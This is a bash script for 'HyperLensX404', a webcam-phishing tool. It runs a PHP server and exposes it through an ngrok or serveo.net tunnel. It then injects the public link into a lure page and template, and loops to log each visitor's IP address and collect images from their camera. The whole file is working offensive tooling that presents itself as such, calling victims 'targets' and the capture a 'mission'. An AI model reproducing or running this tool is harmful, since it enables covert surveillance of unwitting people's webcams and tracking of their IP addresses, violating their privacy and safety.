#!/bin/bash

# Config
OUTPUT_DIR="captured_files"
LOG_FILE="hyperlensx404.log"
PHP_PORT=3333
NGROK_PORT=4045
CAM_ACCESS_TIME=10  # Minimum cam access time (seconds)
IPS_FILE="$OUTPUT_DIR/saved_ips.txt"  # Explicit IP file path

# Colors
RED='\e[1;91m'
GREEN='\e[1;92m'
YELLOW='\e[1;93m'
WHITE='\e[1;97m'
NC='\e[0m'

# Cleanup
clear
rm -f "$LOG_FILE" *.zip
mkdir -p "$OUTPUT_DIR/new" "$OUTPUT_DIR/old"
rm -f "$IPS_FILE"
touch "$IPS_FILE"
mv *.png "$OUTPUT_DIR/old/" 2>/dev/null || true
mv "$OUTPUT_DIR/new/"*.png "$OUTPUT_DIR/old/" 2>/dev/null || true

# Log Function
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
    echo -e "$1"
}

# Banner
banner() {
    clear
    echo -e "${RED}"
    echo "  ╔════════════════════════════════════════════════════╗"
    echo "  ║                                                    ║"
    echo "  ║   [HSX] HyperLensX404 - Strike Fast, Capture Deep  ║"
    echo "  ║                                                    ║"
    echo "  ║   Developed by BlackOps404 Team                    ║"
    echo "  ║   GitHub: https://github.com/BlackOps404           ║"
    echo "  ║                                                    ║"
    echo "  ╚════════════════════════════════════════════════════╝"
    echo -e "${GREEN}  [*] Continuous Cam Access - 10+ Seconds Live!${NC}"
    echo
}

# Stop Function
stop() {
    log "${YELLOW}[!] Stopping HyperLensX404...${NC}"
    pkill -f ngrok 2>/dev/null
    pkill -f php 2>/dev/null
    pkill -f ssh 2>/dev/null
    echo -e "${RED}[+] Mission Aborted!${NC}"
    exit 0
}

# Trap Ctrl+C
trap stop INT

# Check Dependencies
check_deps() {
    for cmd in php wget unzip curl jq ssh; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            echo -e "${RED}[!] $cmd not installed! Install it first.${NC}"
            exit 1
        fi
    done
    log "${GREEN}[+] All dependencies checked!${NC}"
}

# Install Ngrok
install_ngrok() {
    if [ ! -f "ngrok" ]; then
        log "${YELLOW}[+] Installing Ngrok...${NC}"
        ARCH=$(uname -m)
        if [[ "$ARCH" == *"arm"* ]]; then
            wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip || { log "${RED}[!] Ngrok download failed!${NC}"; exit 1; }
        else
            wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip || { log "${RED}[!] Ngrok download failed!${NC}"; exit 1; }
        fi
        unzip ngrok-stable-linux-*.zip 2>/dev/null || { log "${RED}[!] Ngrok unzip failed!${NC}"; exit 1; }
        rm -f ngrok-stable-linux-*.zip
        chmod +x ngrok
        log "${GREEN}[+] Ngrok installed!${NC}"
    fi
    mkdir -p "$HOME/.ngrok2"
    echo "web_addr: $NGROK_PORT" > "$HOME/.ngrok2/ngrok.yml" 2>/dev/null
}

# Start PHP Server
start_php() {
    log "${YELLOW}[+] Starting PHP Server on localhost:$PHP_PORT...${NC}"
    fuser -k $PHP_PORT/tcp 2>/dev/null
    php -S localhost:$PHP_PORT -t . > php_errors.log 2>&1 &
    sleep 2
    if ! ps aux | grep -q "[p]hp -S localhost:$PHP_PORT"; then
        log "${RED}[!] PHP Server failed to start! Check php_errors.log${NC}"
        cat php_errors.log
        exit 1
    fi
    log "${GREEN}[+] PHP Server running!${NC}"
}

# Ngrok Server
ngrok_server() {
    install_ngrok
    start_php
    log "${YELLOW}[+] Launching Ngrok Tunnel...${NC}"
    ./ngrok http $PHP_PORT > ngrok.log 2>&1 &
    sleep 10
    LINK=$(curl -s http://127.0.0.1:$NGROK_PORT/api/tunnels | jq -r '.tunnels[0].public_url')
    if [[ -z "$LINK" ]]; then
        log "${RED}[!] Ngrok tunnel failed! Check ngrok.log${NC}"
        cat ngrok.log
        exit 1
    fi
    if [[ "$LINK" != "https"* ]]; then LINK="https${LINK#http}"; fi
    echo -e "${GREEN}[+] Direct Link: ${WHITE}$LINK${NC}"
    inject_payload "$LINK"
    capture_loop
}

# Serveo Server
serveo_server() {
    start_php
    log "${YELLOW}[+] Starting Serveo Tunnel...${NC}"
    SUBDOMAIN="hyperlens$RANDOM"
    echo -e "${YELLOW}[+] Subdomain: $SUBDOMAIN (Press Enter for default, or type custom)${NC}"
    read -p "> " CUSTOM_SUB
    SUBDOMAIN=${CUSTOM_SUB:-$SUBDOMAIN}
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R $SUBDOMAIN:80:localhost:$PHP_PORT serveo.net > sendlink 2>&1 &
    sleep 10
    LINK=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    if [[ -z "$LINK" ]]; then
        log "${RED}[!] Serveo tunnel failed! Check sendlink file${NC}"
        cat sendlink
        exit 1
    fi
    echo -e "${GREEN}[+] Direct Link: ${WHITE}$LINK${NC}"
    inject_payload "$LINK"
    capture_loop
}

# Inject Payload
inject_payload() {
    local LINK=$1
    log "${YELLOW}[+] Injecting Payload with $LINK...${NC}"
    if [ ! -f "cam-dumper.html" ] || [ ! -f "template.php" ]; then
        log "${RED}[!] Missing cam-dumper.html or template.php!${NC}"
        exit 1
    fi
    sed "s|forwarding_link|$LINK|g" cam-dumper.html > index.html
    sed "s|forwarding_link|$LINK|g" template.php > index.php
    if [ ! -f "index.html" ] || [ ! -f "index.php" ]; then
        log "${RED}[!] Payload injection failed!${NC}"
        exit 1
    fi
    log "${GREEN}[+] Payload injected successfully!${NC}"
}

# Capture Loop with Continuous Cam Access
capture_loop() {
    log "${GREEN}[*] Waiting for Targets... Continuous Cam Access (Min $CAM_ACCESS_TIME sec)${NC}"
    echo -e "${YELLOW}[+] Press Ctrl+C to Stop${NC}"
    while true; do
        if [ -f "ip.txt" ]; then
            IP=$(grep 'IP:' ip.txt | cut -d " " -f2)
            echo -e "${GREEN}[+] Target IP Captured: ${WHITE}$IP${NC}"
            log "${GREEN}[+] IP Captured: $IP${NC}"
            echo "IP: $IP" >> "$IPS_FILE"
            rm -f ip.txt
        fi
        if [ -f "Log.log" ]; then
            echo -e "${GREEN}[+] Camera Access Initiated! Capturing for at least $CAM_ACCESS_TIME sec...${NC}"
            log "${GREEN}[+] Camera Access Started${NC}"
            START_TIME=$(date +%s)
            while [ -f "Log.log" ] || [ $(( $(date +%s) - $START_TIME )) -lt $CAM_ACCESS_TIME ]; do
                if ls *.png >/dev/null 2>&1; then
                    COUNT=$(ls *.png | wc -l)
                    echo -e "${GREEN}[+] Captured $COUNT Images so far...${NC}"
                    mv *.png "$OUTPUT_DIR/new/" 2>/dev/null
                fi
                sleep 1
            done
            echo -e "${GREEN}[+] Camera Access Ended - All Files Captured!${NC}"
            log "${GREEN}[+] Camera Access Ended${NC}"
            rm -f Log.log
        fi
        sleep 0.1
    done
}

# Main Menu
main_menu() {
    banner
    check_deps
    echo -e "${YELLOW}[1] Serveo.net${NC}"
    echo -e "${YELLOW}[2] Ngrok${NC}"
    read -p "${GREEN}[+] Choose Tunneling Option (1/2): ${NC}" CHOICE
    case $CHOICE in
        1) serveo_server ;;
        2) ngrok_server ;;
        *) echo -e "${RED}[!] Invalid Option!${NC}"; sleep 1; main_menu ;;
    esac
}

# Start
main_menu
